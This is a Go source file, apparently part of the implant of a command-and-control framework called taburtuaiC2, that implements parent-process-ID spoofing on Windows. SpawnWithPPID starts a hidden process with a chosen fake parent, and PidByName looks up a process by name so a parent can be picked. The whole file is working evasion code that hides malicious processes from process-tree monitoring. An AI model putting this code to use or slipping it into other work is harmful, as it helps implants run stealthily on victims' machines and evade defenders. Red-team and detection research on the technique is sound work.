//go:build windows

package inject

import (
	"fmt"
	"os/exec"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

type startupInfoEx struct {
	windows.StartupInfo
	ProcThreadAttributeList uintptr
}

// SpawnWithPPID creates a new process with a spoofed parent (parentPID) in the process tree.
func SpawnWithPPID(executable, args string, parentPID uint32) (windows.ProcessInformation, error) {
	var pi windows.ProcessInformation

	hParent, err := windows.OpenProcess(winsyscall.ProcessAllAccess, false, parentPID)
	if err != nil {
		return pi, fmt.Errorf("OpenProcess(parent %d): %w", parentPID, err)
	}
	defer windows.CloseHandle(hParent)

	var attrListSize uintptr
	winsyscall.ProcInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))

	attrBuf := make([]byte, attrListSize)
	r, _, e := winsyscall.ProcInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(&attrBuf[0])), 1, 0, uintptr(unsafe.Pointer(&attrListSize)),
	)
	if r == 0 {
		return pi, fmt.Errorf("InitializeProcThreadAttributeList: %v", e)
	}
	defer winsyscall.ProcDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrBuf[0])))

	r, _, e = winsyscall.ProcUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(&attrBuf[0])),
		0,
		winsyscall.ProcThreadAttributeParentProcess,
		uintptr(unsafe.Pointer(&hParent)),
		unsafe.Sizeof(hParent),
		0, 0,
	)
	if r == 0 {
		return pi, fmt.Errorf("UpdateProcThreadAttribute: %v", e)
	}

	siEx := startupInfoEx{}
	siEx.StartupInfo.Cb = uint32(unsafe.Sizeof(siEx))
	siEx.StartupInfo.Flags = windows.STARTF_USESHOWWINDOW
	siEx.StartupInfo.ShowWindow = windows.SW_HIDE
	siEx.ProcThreadAttributeList = uintptr(unsafe.Pointer(&attrBuf[0]))

	exePtr, _ := windows.UTF16PtrFromString(executable)

	var cmdPtr *uint16
	if args != "" {
		cmd := `"` + executable + `" ` + args
		cmdPtr, _ = windows.UTF16PtrFromString(cmd)
	}

	err = windows.CreateProcess(
		exePtr, cmdPtr, nil, nil, false,
		winsyscall.ExtendedStartupInfoPresent|winsyscall.CreateNewConsole,
		nil, nil,
		(*windows.StartupInfo)(unsafe.Pointer(&siEx)),
		&pi,
	)
	if err != nil {
		return pi, fmt.Errorf("CreateProcess: %w", err)
	}
	windows.CloseHandle(pi.Thread)
	return pi, nil
}

// PidByName returns the first PID whose image name contains name (case-insensitive).
func PidByName(name string) (uint32, error) {
	out, err := exec.Command("tasklist", "/FO", "CSV", "/NH").Output()
	if err != nil {
		return 0, fmt.Errorf("tasklist: %w", err)
	}
	nameLower := strings.ToLower(strings.TrimSuffix(strings.ToLower(name), ".exe"))
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, ",", 3)
		if len(parts) < 2 {
			continue
		}
		proc := strings.Trim(strings.ToLower(parts[0]), `"`)
		proc = strings.TrimSuffix(proc, ".exe")
		if strings.Contains(proc, nameLower) {
			pidStr := strings.Trim(parts[1], `"`)
			var pid uint32
			fmt.Sscanf(pidStr, "%d", &pid)
			if pid > 0 {
				return pid, nil
			}
		}
	}
	return 0, fmt.Errorf("process %q not found", name)
}
